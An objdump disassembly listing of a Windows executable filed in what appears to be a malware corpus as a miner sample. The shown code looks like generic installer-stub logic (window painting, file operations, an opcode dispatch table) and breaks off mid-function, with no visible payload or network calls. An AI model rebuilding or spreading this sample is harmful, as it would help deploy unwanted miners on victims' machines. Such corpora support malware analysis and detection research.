
malware_samples/miner/cac8f75b454179510700d7b1c5f38bddfd3cedff81b3100dab5f375d6d3cda01.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 1b 45 00    	mov    0x451b68,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 48 72 40 00    	call   *0x407248
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 70 1b 45 00    	mov    0x451b70,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 4c 72 40 00    	call   *0x40724c
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 50 72 40 00    	call   *0x407250
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 70 40 00    	mov    0x407044,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 48 70 40 00    	call   *0x407048
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 54 72 40 00    	call   *0x407254
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 4c 70 40 00    	call   *0x40704c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 54 70 40 00    	call   *0x407054
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 58 70 40 00    	mov    0x407058,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 db 44 00       	push   $0x44db60
  401155:	57                   	push   %edi
  401156:	ff 15 58 72 40 00    	call   *0x407258
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 5c 72 40 00    	call   *0x40725c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 1b 45 00       	mov    0x451b88,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 20 00 00    	imul   $0x2018,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c 1b 45 00    	cmp    0x451b8c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 20 00 00    	imul   $0x2018,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 20 00 00       	add    $0x2018,%eax
  4011e1:	3b 35 8c 1b 45 00    	cmp    0x451b8c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 20 00 00    	imul   $0x2018,%esi,%esi
  401201:	8b 1d 88 1b 45 00    	mov    0x451b88,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c 1b 45 00    	cmp    0x451b8c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 20 00 00    	imul   $0x2018,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c 1b 45 00    	cmp    0x451b8c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 1b 45 00       	mov    0x451b88,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c 1b 45 00    	cmp    %esi,0x451b8c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 20 00 00    	add    $0x2018,%edx
  4012d5:	3b 35 8c 1b 45 00    	cmp    0x451b8c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 70 1b 45 00       	mov    0x451b70,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c 1b 45 00    	mov    0x451b8c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 1b 45 00    	mov    0x451b88,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 20 00 00    	add    $0x2018,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 20 45 00       	mov    $0x452000,%ecx
  40137b:	c1 e0 0d             	shl    $0xd,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 fd 45 00 00       	call   0x405983
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 1b 45 00    	mov    0x451b90,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c db 44 00    	add    %eax,0x44db4c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 db 44 00    	push   0x44db34
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c db 44 00    	push   0x44db4c
  4013e4:	ff 15 30 71 40 00    	call   *0x407130
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 44 72 40 00    	call   *0x407244
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 70 1b 45 00    	mov    0x451b70,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 80 bb 40 00       	push   $0x40bb80
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 79 39 00 00       	call   0x404daa
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  40143d:	a1 68 1b 45 00       	mov    0x451b68,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40144e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401458:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0d             	shl    $0xd,%esi
  401462:	b9 00 20 45 00       	mov    $0x452000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0d             	shl    $0xd,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401474:	89 0d 78 9b 40 00    	mov    %ecx,0x409b78
  40147a:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 02 14 00 00    	ja     0x40288b
  401489:	ff 24 8d 9d 28 40 00 	jmp    *0x40289d(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 13 39 00 00       	call   0x404daa
  401497:	e9 72 0d 00 00       	jmp    0x40220e
  40149c:	ff 05 2c db 44 00    	incl   0x44db2c
  4014a2:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  4014a5:	0f 84 63 0d 00 00    	je     0x40220e
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 f8 71 40 00    	call   *0x4071f8
  4014b2:	e9 57 0d 00 00       	jmp    0x40220e
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 cc 13 00 00       	jmp    0x402896
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 d9 38 00 00       	call   0x404daa
  4014d1:	e9 b5 13 00 00       	jmp    0x40288b
  4014d6:	53                   	push   %ebx
  4014d7:	e8 fd 14 00 00       	call   0x4029d9
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	7f 03                	jg     0x4014e4
  4014e1:	33 c0                	xor    %eax,%eax
  4014e3:	40                   	inc    %eax
  4014e4:	50                   	push   %eax
  4014e5:	ff 15 88 70 40 00    	call   *0x407088
  4014eb:	e9 9b 13 00 00       	jmp    0x40288b
  4014f0:	ff 75 cc             	push   -0x34(%ebp)
  4014f3:	ff 15 fc 71 40 00    	call   *0x4071fc
  4014f9:	e9 8d 13 00 00       	jmp    0x40288b
  4014fe:	c1 e0 02             	shl    $0x2,%eax
  401501:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401504:	75 22                	jne    0x401528
  401506:	8b 88 e0 1b 45 00    	mov    0x451be0(%eax),%ecx
  40150c:	6a 01                	push   $0x1
  40150e:	89 88 20 1c 45 00    	mov    %ecx,0x451c20(%eax)
  401514:	e8 c0 14 00 00       	call   0x4029d9
  401519:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40151c:	89 04 8d e0 1b 45 00 	mov    %eax,0x451be0(,%ecx,4)
  401523:	e9 63 13 00 00       	jmp    0x40288b
  401528:	8b 88 20 1c 45 00    	mov    0x451c20(%eax),%ecx
  40152e:	89 88 e0 1b 45 00    	mov    %ecx,0x451be0(%eax)
  401534:	e9 52 13 00 00       	jmp    0x40288b
  401539:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40153c:	8d 34 85 e0 1b 45 00 	lea    0x451be0(,%eax,4),%esi
  401543:	33 c0                	xor    %eax,%eax
  401545:	8b 0e                	mov    (%esi),%ecx
  401547:	3b cb                	cmp    %ebx,%ecx
  401549:	0f 94 c0             	sete   %al
  40154c:	23 4d e8             	and    -0x18(%ebp),%ecx
  40154f:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401553:	89 0e                	mov    %ecx,(%esi)
  401555:	e9 3c 13 00 00       	jmp    0x402896
  40155a:	ff 34 95 e0 1b 45 00 	push   0x451be0(,%edx,4)
  401561:	56                   	push   %esi
  401562:	e9 cc 12 00 00       	jmp    0x402833
  401567:	8b 0d 30 db 44 00    	mov    0x44db30,%ecx
  40156d:	8b 35 60 72 40 00    	mov    0x407260,%esi
  401573:	3b cb                	cmp    %ebx,%ecx
  401575:	74 07                	je     0x40157e
  401577:	52                   	push   %edx
  401578:	51                   	push   %ecx
  401579:	ff d6                	call   *%esi
  40157b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40157e:	8b 0d 44 db 44 00    	mov    0x44db44,%ecx
  401584:	3b cb                	cmp    %ebx,%ecx
  401586:	0f 84 ff 12 00 00    	je     0x40288b
  40158c:	50                   	push   %eax
  40158d:	51                   	push   %ecx
  40158e:	ff d6                	call   *%esi
  401590:	e9 f6 12 00 00       	jmp    0x40288b
  401595:	6a f0                	push   $0xfffffff0
  401597:	e8 5a 14 00 00       	call   0x4029f6
  40159c:	ff 75 e0             	push   -0x20(%ebp)
  40159f:	50                   	push   %eax
  4015a0:	ff 15 84 70 40 00    	call   *0x407084
  4015a6:	85 c0                	test   %eax,%eax
  4015a8:	0f 85 dd 12 00 00    	jne    0x40288b
  4015ae:	e9 a9 10 00 00       	jmp    0x40265c
  4015b3:	6a f0                	push   $0xfffffff0
  4015b5:	e8 3c 14 00 00       	call   0x4029f6
  4015ba:	8b f8                	mov    %eax,%edi
  4015bc:	57                   	push   %edi
  4015bd:	e8 d1 3f 00 00       	call   0x405593
  4015c2:	8b f0                	mov    %eax,%esi
  4015c4:	3b f3                	cmp    %ebx,%esi
  4015c6:	74 42                	je     0x40160a
  4015c8:	6a 5c                	push   $0x5c
  4015ca:	56                   	push   %esi
  4015cb:	e8 5a 3f 00 00       	call   0x40552a
  4015d0:	8b f0                	mov    %eax,%esi
  4015d2:	53                   	push   %ebx
  4015d3:	57                   	push   %edi
  4015d4:	8a 06                	mov    (%esi),%al
  4015d6:	88 1e                	mov    %bl,(%esi)
  4015d8:	88 45 0b             	mov    %al,0xb(%ebp)
  4015db:	ff 15 80 70 40 00    	call   *0x407080
  4015e1:	85 c0                	test   %eax,%eax
  4015e3:	75 1b                	jne    0x401600
  4015e5:	ff 15 7c 70 40 00    	call   *0x40707c
  4015eb:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4015f0:	75 0b                	jne    0x4015fd
  4015f2:	57                   	push   %edi
  4015f3:	ff 15 78 70 40 00    	call   *0x407078
  4015f9:	a8 10                	test   $0x10,%al
  4015fb:	75 03                	jne    0x401600
  4015fd:	ff 45 fc             	incl   -0x4(%ebp)
  401600:	8a 45 0b             	mov    0xb(%ebp),%al
  401603:	88 06                	mov    %al,(%esi)
  401605:	46                   	inc    %esi
  401606:	3a c3                	cmp    %bl,%al
  401608:	75 be                	jne    0x4015c8
  40160a:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40160d:	74 1e                	je     0x40162d
  40160f:	6a e6                	push   $0xffffffe6
  401611:	e8 0d fe ff ff       	call   0x401423
  401616:	57                   	push   %edi
  401617:	68 00 e0 47 00       	push   $0x47e000
  40161c:	e8 eb 43 00 00       	call   0x405a0c
  401621:	57                   	push   %edi
  401622:	ff 15 74 70 40 00    	call   *0x407074
  401628:	e9 5e 12 00 00       	jmp    0x40288b
  40162d:	6a f5                	push   $0xfffffff5
  40162f:	e9 30 0b 00 00       	jmp    0x402164
  401634:	53                   	push   %ebx
  401635:	e8 bc 13 00 00       	call   0x4029f6
  40163a:	50                   	push   %eax
  40163b:	e8 c7 46 00 00       	call   0x405d07
  401640:	e9 35 06 00 00       	jmp    0x401c7a
  401645:	6a d0                	push   $0xffffffd0
  401647:	e8 aa 13 00 00       	call   0x4029f6
  40164c:	6a df                	push   $0xffffffdf
  40164e:	8b f0                	mov    %eax,%esi
  401650:	e8 a1 13 00 00       	call   0x4029f6
  401655:	6a 13                	push   $0x13
  401657:	8b f8                	mov    %eax,%edi
  401659:	e8 98 13 00 00       	call   0x4029f6
  40165e:	57                   	push   %edi
  40165f:	56                   	push   %esi
  401660:	ff 15 70 70 40 00    	call   *0x407070
  401666:	85 c0                	test   %eax,%eax
  401668:	74 07                	je     0x401671
  40166a:	6a e3                	push   $0xffffffe3
  40166c:	e9 f3 0a 00 00       	jmp    0x402164
  401671:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401674:	0f 84 e2 0f 00 00    	je     0x40265c
  40167a:	56                   	push   %esi
  40167b:	e8 87 46 00 00       	call   0x405d07
  401680:	85 c0                	test   %eax,%eax
  401682:	0f 84 d4 0f 00 00    	je     0x40265c
  401688:	57                   	push   %edi
  401689:	56                   	push   %esi
  40168a:	e8 cb 40 00 00       	call   0x40575a
  40168f:	6a e4                	push   $0xffffffe4
  401691:	e9 ce 0a 00 00       	jmp    0x402164
  401696:	53                   	push   %ebx
  401697:	e8 5a 13 00 00       	call   0x4029f6
  40169c:	8b f0                	mov    %eax,%esi
  40169e:	8d 45 08             	lea    0x8(%ebp),%eax
  4016a1:	50                   	push   %eax
  4016a2:	57                   	push   %edi
  4016a3:	68 00 20 00 00       	push   $0x2000
  4016a8:	56                   	push   %esi
  4016a9:	ff 15 6c 70 40 00    	call   *0x40706c
  4016af:	85 c0                	test   %eax,%eax
  4016b1:	74 23                	je     0x4016d6
  4016b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4016b6:	3b c6                	cmp    %esi,%eax
  4016b8:	76 25                	jbe    0x4016df
  4016ba:	38 18                	cmp    %bl,(%eax)
  4016bc:	74 21                	je     0x4016df
  4016be:	56                   	push   %esi
  4016bf:	e8 43 46 00 00       	call   0x405d07
  4016c4:	3b c3                	cmp    %ebx,%eax
  4016c6:	74 0e                	je     0x4016d6
  4016c8:	83 c0 2c             	add    $0x2c,%eax
  4016cb:	50                   	push   %eax
  4016cc:	ff 75 08             	push   0x8(%ebp)
  4016cf:	e8 38 43 00 00       	call   0x405a0c
